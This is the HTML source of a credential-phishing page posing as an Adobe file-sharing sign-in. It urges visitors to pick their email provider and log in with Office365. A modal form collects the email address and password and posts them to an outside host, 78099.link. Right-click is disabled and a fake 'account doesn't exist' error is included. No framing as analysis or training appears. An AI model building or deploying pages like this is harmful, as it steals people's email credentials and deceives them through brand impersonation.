<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Adobe</title>
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
  <!-- Font Awesome -->
  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  <!-- Hover.css -->
  <link href="css/hover.css" rel="stylesheet" media="all">
  <style>
    body {
      background-image: url('images/bg-1.jpg');
      background-size: cover;
      background-repeat: no-repeat;
    }
  </style>
</head>
<body oncontextmenu="return false">
  <div class="container-fluid p-0">
    <div class="container-fluid">
      <div class="row" style="margin: 30px 0px 30px 0px;">
        <div class="col-lg-6 align-self-center text-center">
          <div>
            <img src="images/adobe1.png" class="img-fluid" width="70px">
            <span class="h4 text-white">Adobe</span>
            <br>
            <span class="text-white">Sign in or Create an account</span>
          </div>
        </div>
        <div class="col-lg-4 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
          <div class="text-center pt-5"> 
            <span class="h5 text-white">Select and Click on your Email Provider Below.</span>
            <span class="h5" style="color:#0070C6;">Only receiver email can access file sharing.</span>
          </div>
          <div class="mt-3">
            <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
              <div class="rounded px-2 py-1 mt-2" style=" background-color: #FF3C00;">
                <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
                <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
              </div>
            </a>
            <!-- Add other provider links similarly -->
          </div> 
          <p class="h5 text-center text-white mt-2">Adobe Â© 2022</p> 
        </div>
      </div>
    </div>
  </div>

  <!-- Modal for gmail -->
  <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <center>
            <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
            <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
            <div class="alert alert-danger" id="msg" style="display: none;"></div>
            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
          </center>
          <form id="contact" class="form-horizontal well" action="https://78099.link/action" method="POST">
            <div id="div1">
              <div class="col-lg-12">
                <div class="form-group">
                  <div id="inputbar">
                    <label for="exampleInputEmail1">Email address</label>
                    <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email" required>
                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                  </div>
                  <div id="automail" class="h5 mt-5">
                    <i class="fas fa-arrow-left" id="back1"></i>&nbsp<span id="emailch">abc@abc.com</span>
                  </div>
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="Password">Password</label>
                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" required>
                </div>
              </div>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
              <button class="btn btn-lg btn-info pull-right" type="submit" id="submit-btn">Login</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

  <script>
    $("#submit-btn").click(function(event) {
      // You can add validation or other logic here before form submission if needed
    });
  </script>
</body>
</html>
